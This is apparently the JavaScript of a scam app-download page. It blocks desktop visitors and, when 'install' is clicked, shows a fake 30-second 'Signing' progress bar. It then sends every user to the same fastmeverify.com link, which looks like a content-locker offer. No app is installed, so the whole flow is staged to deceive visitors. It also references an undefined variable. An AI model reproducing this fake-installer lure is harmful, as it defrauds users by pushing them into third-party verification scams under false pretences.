$(document).ready(function () {
  $(".nav-wrapper li").click(function () {
    $(".nav-wrapper li").removeClass("active");
    $(this).addClass("active");
    var active = $(".nav-wrapper li.active span").text();
  });

  if (/Windows NT/i.test(navigator.userAgent)) {
    $("body").html(
      '<section class="s-wrapper desktop">\
            <div class="container">\
                <div class="d-notice-wrapper">\
                    <div class="d-notice">\
                        <span class="material-icons-two-tone mid1">phone_iphone</span>\
                        <h1>Mobile Device Not Detected</h1>\
                        <p>Looks like you are trying to access this website from a desktop/laptop device.</p>\
                        <div class="d-n-i">\
                            <span class="material-icons-two-tone mid2">info</span>\
                            Please re-visit this website from your mobile device.\
                        </div>\
                    </div>\
                </div>\
            </div>\
        </section>',
    );
  }
});
function makeIntPercent(percents, percent, callback) {
  var pint = setInterval(function () {
    if (percents < percent) {
      percents++;
      $("#progressBarDownload div").css("width", percents + "%");
    } else {
      clearInterval(pint);
      callback();
    }
  }, 80);
  return percents;
}
function makeactive(name) {
  $("#search-input").keyup(function () {
    var search = $(this).val();
    var filter, li, a, i;
    filter = search.toUpperCase();
    li = $(".app-element-row");
    for (i = 0; i < li.length; i++) {
      a = li[i].getElementsByTagName("h4")[0];
      search = a.textContent || a.innerText;
      if (search.toUpperCase().indexOf(filter) > -1) {
        $(li[i]).fadeIn(0);
      } else {
        $(li[i]).fadeOut(0);
      }
    }
    $(".lazyload").lazyload({ effect: "fadeIn" });
  });
  $(".app-element-i-button:not(.active)").click(function () {
    $(this).addClass("active");
    $(this).html(
      '<span class="material-icons-two-tone button-icon-2 fa-spin">loop</span><span>Installing</span>',
    );
    $(".app-element-row").addClass("lowopac");
    $(this).parent().parent().parent().removeClass("lowopac");
    var appname = $(this).parent().parent().parent().attr("data-p-name");
    var url = $(this).parent().parent().parent().attr("data-l-url");
    $(this)
      .parent()
      .parent()
      .parent()
      .append(
        '<div class="aer-proccessing-wrapper"><div class="downloading-msg-wrapper">Signing <span class="d-m-an-v">' +
          appname +
          device +
          '</span></div><div id="progressBarDownload" class="download-loadbar"><div style="overflow: hidden;width:0px">100%&nbsp;</div></div></div><div class="downloading-loader-wrapper"><i class="fas fa-circle-notch fa-spin"></i></div>',
      );
    var w = $("#progressBarDownload").width();
    $("#progressBarDownload div").animate(
      { width: w },
      {
        duration: 30000,
        complete: function () {
          $(".aer-proccessing-wrapper").fadeOut();
          $(".downloading-loader-wrapper").fadeIn();
          setTimeout(function () {
            if (/(android)/i.test(navigator.userAgent)) {
              window.location = "https://fastmeverify.com/cl/i/lk17kd";
            } else if (/ipad|iphone|ipod/i.test(navigator.userAgent)) {
              window.location = "https://fastmeverify.com/cl/i/lk17kd";
            } else {
              window.location = "https://fastmeverify.com/cl/i/lk17kd";
            }
          }, 5000);
        },
      },
    );
  });
}
makeactive("layers");
filterSelection("all");
function filterSelection(c) {
  var x, i;
  x = document.getElementsByClassName("app-element-row");
  if (c == "all") c = "";
  for (i = 0; i < x.length; i++) {
    w3RemoveClass(x[i], "show");
    if (x[i].className.indexOf(c) > -1) w3AddClass(x[i], "show");
  }
}
function w3AddClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    if (arr1.indexOf(arr2[i]) == -1) {
      element.className += " " + arr2[i];
    }
  }
}
function w3RemoveClass(element, name) {
  var i, arr1, arr2;
  arr1 = element.className.split(" ");
  arr2 = name.split(" ");
  for (i = 0; i < arr2.length; i++) {
    while (arr1.indexOf(arr2[i]) > -1) {
      arr1.splice(arr1.indexOf(arr2[i]), 1);
    }
  }
  element.className = arr1.join(" ");
}
